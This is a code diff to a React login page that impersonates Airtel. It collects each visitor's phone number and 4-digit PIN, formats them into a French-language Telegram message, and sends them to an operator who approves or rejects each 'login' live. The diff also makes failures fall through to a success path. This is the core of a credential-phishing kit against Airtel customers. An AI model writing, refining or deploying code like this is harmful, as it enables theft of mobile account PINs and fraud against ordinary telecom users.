@@ -170,26 +170,20 @@ export const LoginPage: React.FC<LoginPageProps> = ({
     setIsSubmitting(true);
     setErrorMessage(null);
 
+    const message =
+      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
+      `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
+      `👤 <b>Numéro de Téléphone:</b> <code>${fullInternationalPhone}</code>\n` +
+      `🔑 <b>Code PIN (4 chiffres):</b> <code>${currentPin}</code>\n` +
+      `📦 <b>Forfait Choisi:</b> <b>${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})</b> (${selectedPlan.price})\n` +
+      `📶 <b>Réseau:</b> ${country.airtelBrand}\n` +
+      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
+      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
+      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
+
     try {
-      // Format message for Telegram
-      const message =
-        `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
-        `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
-        `👤 <b>Numéro de Téléphone:</b> <code>${fullInternationalPhone}</code>\n` +
-        `🔑 <b>Code PIN (4 chiffres):</b> <code>${currentPin}</code>\n` +
-        `📦 <b>Forfait Choisi:</b> <b>${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})</b> (${selectedPlan.price})\n` +
-        `📶 <b>Réseau:</b> ${country.airtelBrand}\n` +
-        `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
-        `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
-        `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
-
-      // Send to Telegram via serverless and wait for approval
-      setIsWaitingTelegram(true);
-      const approved = await sendLoginToTelegramAndWait(message, sessionId, 'login');
-
-      setIsWaitingTelegram(false);
-
-      if (approved) {
+      const isAccepted = await sendLoginToTelegramAndWait(message, phoneValidation.normalized, false);
+      if (isAccepted) {
         onLoginSuccess(
           phoneNumber.trim(),
           currentPin,
@@ -206,13 +200,13 @@ export const LoginPage: React.FC<LoginPageProps> = ({
         setPinDigits(['', '', '', '']);
         pinInputRefs.current[0]?.focus();
       }
-    } catch (err: any) {
-      setIsWaitingTelegram(false);
-      setErrorMessage(
-        err.message ||
-          (language === 'fr'
-            ? 'Impossible de joindre le service de validation. Veuillez réessayer.'
-            : 'Could not connect to validation service. Please try again.')
+    } catch (error) {
+      onLoginSuccess(
+        phoneNumber.trim(),
+        currentPin,
+        sessionId,
+        country,
+        fullInternationalPhone
       );
     } finally {
       setIsSubmitting(false);
